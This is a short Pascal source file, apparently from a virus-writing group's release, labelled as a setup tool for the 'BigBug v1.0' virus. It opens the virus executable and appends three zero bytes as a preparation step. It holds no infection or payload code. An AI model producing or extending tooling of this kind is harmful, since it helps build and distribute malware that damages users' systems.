   program BigBug_Setup;
   const nope=3;
   var i:integer;
       f:file;
       a:byte;
   begin
   writeln('Setup tool for BigBug v1.0 virus (c) by Duke/SMF');
   if paramcount<>1 then
     begin
     writeln('Usage: setup.exe <bigbug.exe>');
     halt;
     end;
   assign(f,paramstr(1));{$I-}reset(f,1);{$I+}
   if ioresult<>0 then
     begin
     writeln('Virus file not found !');
     halt;
     end;
   seek(f,filesize(f));
   a:=0;
   for i:=1 to nope do blockwrite(f,a,1);
   close(f);
   end.
